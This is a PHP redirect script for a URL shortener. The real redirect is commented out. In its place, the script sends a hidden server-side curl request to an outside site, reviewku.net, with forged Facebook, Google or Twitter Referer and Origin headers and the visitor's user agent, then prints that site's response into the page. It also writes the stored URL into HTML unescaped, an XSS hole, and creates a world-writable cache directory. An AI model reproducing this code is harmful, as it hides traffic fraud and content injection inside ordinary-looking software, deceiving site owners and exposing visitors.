<?php
ini_set('display_errors', 0);

if(!preg_match('|^[0-9a-zA-Z]{1,6}$|', $_GET['url']))
{
	die('That is not a valid short url');
}

require('config.php');

$shortened_id = getIDFromShortenedURL($_GET['url']);

if(CACHE)
{
	$long_url = file_get_contents(CACHE_DIR . $shortened_id);
	if(empty($long_url) || !preg_match('|^https?://|', $long_url))
	{
		$long_url = mysql_result(mysql_query('SELECT long_url FROM ' . DB_TABLE . ' WHERE id="' . mysql_real_escape_string($shortened_id) . '"'), 0, 0);
		@mkdir(CACHE_DIR, 0777);
		$handle = fopen(CACHE_DIR . $shortened_id, 'w+');
		fwrite($handle, $long_url);
		fclose($handle);
	}
}
else
{
	$long_url = mysql_result(mysql_query('SELECT long_url FROM ' . DB_TABLE . ' WHERE id="' . mysql_real_escape_string($shortened_id) . '"'), 0, 0);
}

if(TRACK)
{
	mysql_query('UPDATE ' . DB_TABLE . ' SET referrals=referrals+1 WHERE id="' . mysql_real_escape_string($shortened_id) . '"');
}

echo "
<script type='text/javascript'>
var countdown = 5;
setInterval(function() {
countdown--;
if(countdown < 0) {
//window.location = '#';
document.getElementById('countdown').innerHTML = '<center><a href=".$long_url."><img src=button.png width=150 height=150></a></center>';
}else{
document.getElementById('countdown').innerHTML = '<center><h1>'+countdown+'</h1></center>';
}
}, 1000);
</script>
<div id=countdown style='
        background-color: #fafafa;
    height: 65px;
'>
</div>
";
$array= array("https://www.facebook.com/","https://www.google.com/","https://twitter.com/");
$k = array_rand($array);

$ch = curl_init();

curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_URL,"reviewku.net");
curl_setopt($ch,CURLOPT_HTTPHEADER,array('Origin: '.$array[$k]));
curl_setopt($ch, CURLOPT_FAILONERROR, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_REFERER, $array[$k]); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_TIMEOUT,10);

$server_output = curl_exec ($ch);
curl_close ($ch);

print  $server_output ;
//header('HTTP/1.1 301 Moved Permanently');
//header('Location: ' .  $long_url);
exit;

function getIDFromShortenedURL ($string, $base = ALLOWED_CHARS)
{
	$length = strlen($base);
	$size = strlen($string) - 1;
	$string = str_split($string);
	$out = strpos($base, array_pop($string));
	foreach($string as $i => $char)
	{
		$out += strpos($base, $char) * pow($length, $size - $i);
	}
	return $out;
}